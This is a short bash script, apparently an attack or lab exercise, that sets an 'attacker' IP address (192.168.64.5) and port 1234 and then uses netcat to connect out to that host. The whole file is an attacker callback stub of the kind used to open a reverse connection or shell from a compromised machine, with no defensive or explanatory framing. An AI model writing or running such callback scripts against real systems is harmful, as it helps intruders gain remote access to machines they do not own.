#!/bin/bash

# Define the attacker's IP address and the port
ATTACKER_IP="192.168.64.5"
PORT=1234

# Connect to the attacker
nc $ATTACKER_IP $PORT